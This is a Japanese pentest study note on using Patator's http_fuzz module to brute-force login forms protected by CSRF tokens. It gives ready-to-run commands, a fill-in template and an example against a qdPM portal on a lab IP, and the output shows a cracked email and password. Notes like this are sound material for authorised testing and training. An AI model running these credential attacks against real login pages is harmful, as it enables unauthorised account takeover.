# ✋️Patator実行前に

- **いつ使うか**：CSRFトークン付き、またはセッションに紐づくステートフルなログインフォームへの辞書攻撃。通常のフォームは [Hydra](🐉THC-Hydra.md) で十分だが、**毎リクエストでトークンを取り直し＋セッションCookieを維持**する必要がある場合、Hydra の `http-post-form` では対応しづらいため Patator を使う。
- **Hydraとの使い分け**
  - Hydra … トークン無しの素のフォーム／各種サービス（ssh, ftp, smb…）
  - Patator … **CSRFトークン付き・ステートフルなフォーム**
- **Python 3.14+ で起動時にクラッシュする場合**（`SemLock._rebuild` の `FileNotFoundError`）：3.14で multiprocessing の既定が `fork`→`forkserver` に変わったのが原因。patator 本体の先頭（import 直後）に以下を追加して `fork` を強制する。
  ```python
  import multiprocessing
  multiprocessing.set_start_method('fork', force=True)
  ```
  ※ `apt` 更新で本体が上書きされると消えるので、恒久化するならラッパー経由推奨。

# Summary

CSRFトークン付きログインフォームへの辞書攻撃（骨格）：
```
patator http_fuzz url=<target>/login method=POST \
  body='login[_csrf_token]=_TOKEN_&login[email]=FILE0&login[password]=FILE1' \
  0=emails.txt 1=wordlist.txt \
  before_urls=<target>/login \
  before_egrep='_TOKEN_:name="login\[_csrf_token\]"[^>]*value="([^"]*)"' \
  accept_cookie=1 follow=0 \
  -x ignore:clen=<失敗応答のContent-Length>
```

# 具体例

qdPM のログインポータルに対し、[cewl で生成した](../Cheatsheet/Common/Password%20Attack.md) `emails.txt` をユーザー名リストとして辞書攻撃：
```
patator http_fuzz \
    url=http://192.168.50.11/project/index.php/login \
    method=POST \
    body='login[_csrf_token]=_TOKEN_&login[email]=FILE0&login[password]=FILE1&http_referer=' \
    0=emails.txt \
    1=wordlist.txt \
    before_urls=http://192.168.50.11/project/index.php/login \
    before_egrep='_TOKEN_:name="login\[_csrf_token\]"[^>]*value="([^"]*)"' \
    accept_cookie=1 \
    follow=0 \
    -x ignore:clen=116
```
```
302  847:111   0.163 | george@AIDevCorp.org:AIDevCorp | 641 | HTTP/1.1 302 Found
```
→ 失敗は全て `302` の `clen=116`、成功だけ `clen=111` で浮かび上がる。`code size:clen` 列の `clen`（Content-Length）が他と違う1行が当たり。

# 詳細

## 概要
`patator` はモジュール式の総当たり／辞書攻撃ツール。Web フォームには `http_fuzz` モジュールを使う。Hydra と違い、**各試行の前に別リクエストを挟める（`before_urls`）**ため、CSRFトークンの再取得に対応できるのが強み。

## 使用方法

### CSRFトークン付きログインフォームへの辞書攻撃

#### 構成要素
| オプション | 役割 |
|---|---|
| `url=` | 攻撃対象のログインエンドポイント |
| `method=POST` | 送信メソッド |
| `body='...'` | POSTボディ。`_TOKEN_`（動的トークン）、`FILE0`(email)、`FILE1`(password) のプレースホルダを埋め込む |
| `0=emails.txt` / `1=wordlist.txt` | `FILE0`/`FILE1` に割り当てるリスト |
| `before_urls=` | **各試行の前に**叩くURL。ここで新しいCSRFトークンを発行させる |
| `before_egrep=` | `before_urls` の応答から正規表現でトークンを抽出し `_TOKEN_` に代入。書式は `変数名:正規表現` |
| `accept_cookie=1` | セッションCookieを保持し、トークン取得〜POSTで同一セッションを維持 |
| `follow=0` | リダイレクトを追わない |
| `-x ignore:clen=N` | Content-Length が N の応答（＝失敗）を無視 |

#### 自分の対象に合わせる（テンプレート）
`<...>` が対象ごとに変える所。それ以外は構文なのでそのまま。
```
patator http_fuzz \
    url=http://<TARGET>/<LOGIN_PATH> \                          # ① 対象のログインURL
    method=POST \
    body='<CSRF_FIELD>=_TOKEN_&<USER_FIELD>=FILE0&<PASS_FIELD>=FILE1' \   # ② フォーム項目名
    0=<EMAILS> \                                                # ③ ユーザー名リスト
    1=<WORDLIST> \                                              # ④ パスワードリスト
    before_urls=http://<TARGET>/<LOGIN_PATH> \                  # ①と同じ（トークン発行ページ）
    before_egrep='_TOKEN_:name="<CSRF_FIELD(正規表現)>"[^>]*value="([^"]*)"' \  # ② と同じ項目名
    accept_cookie=1 \
    follow=0 \
    -x ignore:clen=<FAIL_LEN>                                   # ⑤ 失敗応答の長さ
```

| 記号 | 変える所 | 何か／調べ方 |
|---|---|---|
| ① `<TARGET>/<LOGIN_PATH>` | `url=` と `before_urls=` の2箇所 | 対象IP＋ログインURL。例：`192.168.50.11/project/index.php/login` |
| ② `<CSRF_FIELD>` `<USER_FIELD>` `<PASS_FIELD>` | `body=` と `before_egrep=` | **フォームの実際の input name**。devtools/Burp でログインフォームの `<input name="...">` を確認。qdPM例：`login[_csrf_token]` / `login[email]` / `login[password]` |
| ③ `<EMAILS>` | `0=` | ユーザー名・メールのリスト（cewlで作った `emails.txt` など） |
| ④ `<WORDLIST>` | `1=` | パスワード辞書（`rockyou.txt` や `cewl.txt` など） |
| ⑤ `<FAIL_LEN>` | `-x ignore:clen=` | **失敗応答のContent-Length**。先にフィルタ無しで1回流して確認 |

**変えない所（骨格）**：`patator http_fuzz` / `method=POST` / `accept_cookie=1` / `follow=0` / プレースホルダ `_TOKEN_` `FILE0` `FILE1` / `before_egrep` の `_TOKEN_:` と `[^>]*value="([^"]*)"`

> ⚠️ **②の落とし穴**：同じ項目名でも書く場所で書式が違う。
> - `body=` の中 → そのまま：`login[_csrf_token]`
> - `before_egrep=` の中 → **正規表現なので `[` `]` をエスケープ**：`login\[_csrf_token\]`
>
> ここを間違えるとトークンを抽出できず全試行が失敗する。項目名に `[` `]` `.` が入るとき要注意。

#### CSRF処理の流れ（4点が連携）
1. **`before_urls`** … ログインページをGETして、その試行用の新しいトークンを発行させる
2. **`before_egrep`** … 応答HTMLから `value="..."` のトークンを抽出 → `_TOKEN_` に格納
3. **`body` 内の `_TOKEN_`** … 抽出したトークンを乗せて認証POST
4. **`accept_cookie=1`** … 1で得たCookieをPOSTに引き継ぐ（トークンはセッション紐づきのため必須）

→ 1つでも欠けると、トークン切れ or セッション不一致で**全試行が失敗**する。

#### 成否の判定（`-x ignore:clen`）
CSRF付きフォームは成功も失敗も `302` を返しがちで、**HTTPコードでは見分けられない**。そこで**失敗応答のContent-Length**を `ignore:clen=N` で除外し、サイズの違う成功応答だけを残す。

- **Nの値は環境依存**。まず**フィルタ無しで1回流して**失敗応答の `clen` を確認してから `ignore:clen=` に設定する。
- 成功／失敗でサイズが変わらない場合は `follow=1` でリダイレクト先の差を見る、または `Location`／本文のマーカーで `ignore:fgrep=` を使う。

## よくある詰まり
- **全部 `302` で見分けつかない** → 失敗の `clen` を `ignore:clen=` で除外（上記）。それでもダメなら `ignore:size=` で丸ごと除外。
- **`ignore:clen=116` にしたのに失敗が流れ続ける** → 実際の失敗 `clen` がズレている。素で1回流して正しい値を確認する。
- **②の項目名を `before_egrep` でエスケープし忘れ** → トークン抽出に失敗し全滅。
- **起動時に `SemLock._rebuild` エラー** → 冒頭「実行前に」の Python 3.14 fork 対処を適用。

# 参考
- patator 公式：https://github.com/lanjelot/patator
- 関連ノート：[Password Attack（ワードリスト生成・cewl）](../Cheatsheet/Common/Password%20Attack.md) / [Hydra](🐉THC-Hydra.md)
